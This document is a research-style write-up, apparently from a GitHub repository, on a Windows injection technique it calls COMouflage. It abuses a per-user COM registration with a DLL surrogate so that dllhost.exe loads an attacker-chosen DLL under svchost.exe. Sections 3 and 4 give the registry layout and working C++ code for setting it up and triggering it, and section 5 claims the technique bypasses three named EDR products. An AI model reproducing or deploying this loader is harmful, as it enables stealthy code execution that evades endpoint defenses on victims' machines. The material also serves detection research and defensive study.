# COMouflage


# COM-based DLL Surrogate Injection


## Abstract

This paper analyzes a sophisticated injection technique that leverages the Component Object Model (COM) and DLL Surrogate processes for stealthy code execution. Unlike traditional COM hijacking methods focused primarily on persistence, this technique exploits the surrogate hosting capabilities to achieve process injection with several operational advantages, including parent process masquerading and reduced detection footprint.


## 1. Introduction

Component Object Model (COM) hijacking has been extensively documented as a persistence mechanism in the MITRE ATT&CK framework. This paper examines the technical mechanics of COM-based DLL Surrogate injection.


## 2. Technical Background

### 2.1 What is COM?

The Component Object Model (COM) is a Microsoft technology that enables software components to communicate regardless of the programming language used to create them. COM objects are identified by globally unique identifiers (GUIDs) called Class Identifiers (CLSIDs) and can be instantiated through various mechanisms including:

- **In-process servers** (DLLs loaded into the calling process)
- **Out-of-process servers** (Separate executable processes)
- **Surrogate processes** (System-provided hosts for DLL-based COM objects)


### 2.2 Understanding dllhost.exe and DLL Surrogates

`dllhost.exe` is a legitimate Windows system process that serves as a surrogate host for COM objects implemented as DLLs. This mechanism, known as “DLL Surrogate,” allows DLL-based COM objects to run in a separate process space, providing:

- **Process isolation**: Protects the calling application from DLL crashes
- **Security boundaries**: Enables different security contexts
- **Stability**: Prevents unstable DLLs from affecting the parent process

The surrogate is configured through registry entries, specifically the `DllSurrogate` value under the AppID registry key.


## 3. Attack Technique Analysis

### 3.1 Registry Manipulation for HKCU Hijacking

The technique operates by creating specific registry entries in `HKEY_CURRENT_USER` rather than `HKEY_LOCAL_MACHINE`, which provides several advantages:

1. **Reduced privileges required**: No administrator rights needed
1. **User-specific targeting**: Affects only the current user context
1. **Stealth**: Less likely to be monitored compared to HKLM modifications

#### Registry Structure Created:

```
HKCU\Software\Classes\AppID\{CLSID}
├── (Default) = "MyStealthObject"
└── DllSurrogate = ""

HKCU\Software\Classes\CLSID\{CLSID}
├── (Default) = "MyStealthObject"
├── AppID = "{CLSID}"
└── InprocServer32\
    ├── (Default) = "C:\Path\To\Malicious.dll"
    └── ThreadingModel = "Apartment"
```


### 3.2 Process Tree Masquerading

When the malicious COM object is instantiated with `CLSCTX_LOCAL_SERVER`, Windows automatically launches `dllhost.exe` as a surrogate process. This creates a deceptive process tree:

```
svchost.exe (COM+ System Application)
└── dllhost.exe /Processid:{CLSID}
    └── [Malicious DLL loaded in-process]
```

**Key Advantages:**

- The parent process appears as `svchost.exe`, a highly trusted system process
- The initiating malicious process is not the direct parent of the injection target
- Standard parent-child process monitoring may miss the true attack chain

## 4. Detailed Code Analysis

### 4.1 CLSID Definition and Constants

```cpp
static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";
```

The technique begins with a custom CLSID (Class Identifier), a 128-bit GUID that uniquely identifies the COM object. This particular CLSID is crafted to appear distinctive while avoiding conflicts with legitimate system components. The format follows the standard GUID structure: `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`.

### 4.2 Registry Manipulation Function

```cpp
bool SetRegStr(HKEY root, const std::wstring& key, 
               const std::wstring& name, const std::wstring& val) {
    HKEY h;
    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    
    if (RegSetValueExW(h,
        name.empty() ? nullptr : name.c_str(),
        0, REG_SZ,
        (const BYTE*)val.c_str(),
        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS)
    {
        RegCloseKey(h);
        return false;
    }
    RegCloseKey(h);
    return true;
}
```

**Technical Breakdown:**

1. **`RegCreateKeyExW`**: Creates or opens the specified registry key with `KEY_WRITE` permissions
1. **Error Handling**: Each registry operation includes proper error checking
1. **`REG_OPTION_NON_VOLATILE`**: Ensures the key persists across reboots -> Could be changed with **`REG_OPTION_VOLATILE`** (Dtored in memory and is not preserved when the corresponding registry hive is unloaded)

### 4.3 AppID Registry Configuration

```cpp
std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);
if (!SetRegStr(HKEY_CURRENT_USER, appidKey, L"", L"MyStealthObject") ||
    !SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L""))
```

**Critical Analysis:**

- **AppID Key Structure**: `HKCU\Software\Classes\AppID\{CLSID}`
- **Default Value**: “MyStealthObject” serves as a descriptive name
- **`DllSurrogate` = “”**: Empty string is crucial - signals Windows to use the default `dllhost.exe` as surrogate
- **HKCU vs HKLM**: User hive requires no elevation, reduces detection surface

### 4.4 CLSID Registry Configuration

```cpp
std::wstring clsidKey = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";

if (!SetRegStr(HKEY_CURRENT_USER, clsidKey, L"", L"MyStealthObject") ||
    !SetRegStr(HKEY_CURRENT_USER, clsidKey, L"AppID", CLSID_STR) ||
    !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"", L"C:\\Users\\sample.dll") ||
    !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment"))
```

**Registry Structure Explanation:**

1. **CLSID Root**: `HKCU\Software\Classes\CLSID\{CLSID}`
- Links the object to its AppID
- Establishes object identity
1. **InprocServer32 Subkey**: Critical for DLL specification
- **Default Value**: Points to malicious DLL path
- **ThreadingModel**: “Apartment” ensures proper COM threading behavior
- **Path Selection**: Targets user-writable locations to avoid privilege escalation

### 4.5 COM Initialization and Object Creation

```cpp
HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
if (FAILED(hr)) {
    std::wcerr << L"[!] CoInitializeEx: 0x" << std::hex << hr << L"\n";
    return 1;
}

CLSID clsid;
hr = CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
if (FAILED(hr)) {
    std::wcerr << L"[!] Invalid CLSID\n";
    return 1;
}
```

**Technical Details:**

- **`CoInitializeEx`**: Initializes COM library for current thread
- **`COINIT_APARTMENTTHREADED`**: Single-threaded apartment model
- **`CLSIDFromString`**: Converts string representation to binary CLSID structure
- **Error Handling**: HRESULT checking follows COM best practices

### 4.6 Critical Injection Trigger

```cpp
IUnknown* p;
hr = CoCreateInstance(clsid, nullptr,
    CLSCTX_LOCAL_SERVER,    // Key parameter!
    IID_IUnknown,
    (void**)&p);
```

**The `CLSCTX_LOCAL_SERVER` Significance:**

- **Process Boundary**: Forces out-of-process instantiation
- **Surrogate Trigger**: Windows automatically launches `dllhost.exe`
- **Parent Process Masquerading**: Creates `svchost.exe` → `dllhost.exe` chain

### 4.7 Process Flow Analysis

**Execution Sequence:**

1. Registry entries created in HKCU
1. COM system initialized
1. `CoCreateInstance` called with `CLSCTX_LOCAL_SERVER`
1. Windows COM Service Control Manager (SCM) processes the request
1. SCM detects `DllSurrogate` value and launches `dllhost.exe`
1. `dllhost.exe` loads the specified DLL from `InprocServer32`
1. Malicious code executes within the surrogate process context

**Result:** The malicious DLL runs in `dllhost.exe` with `svchost.exe` as apparent parent, obscuring the true attack vector.


## 5. COMouflage versus EDR's


### Microsoft Defender EDR
Bypass – dllhost.exe activity was observed, but no alert was raised.


https://github.com/user-attachments/assets/f6c81b42-14f0-4817-9aa0-fbc388ceef48

Screenshots:
<img width="2048" height="134" alt="DefenderScrenshot" src="https://github.com/user-attachments/assets/b84a38ed-b99a-4331-b299-bbb776d3ebd7" />


### Palo Alto Cortex 


Bypass – Cortex also failed to detect the surrogate execution.


https://github.com/user-attachments/assets/155cae35-01f4-416a-be67-afd72c26dcff



### SentinelOne

Bypass – likewise, no detection by SentinelOne.

https://github.com/user-attachments/assets/77e87580-4d56-464d-889e-1a5f23210ccc



## 6. Conclusion

COM-based DLL Surrogate injection represents an evolution of traditional COM hijacking techniques, offering adversaries enhanced stealth capabilities through process tree masquerading. The technique’s reliance on legitimate Windows functionality makes detection challenging but not impossible with proper monitoring and forensic awareness.
This technique highlights the importance of understanding legitimate Windows mechanisms that can be subverted for malicious purposes.


## 7. References


[1] https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal


[2] https://learn.microsoft.com/de-de/windows/win32/com/dllsurrogate


[3] https://attack.mitre.org/techniques/T1546/015/


[4] https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance


[5] https://learn.microsoft.com/en-us/windows/win32/cossdk/com--threading-models
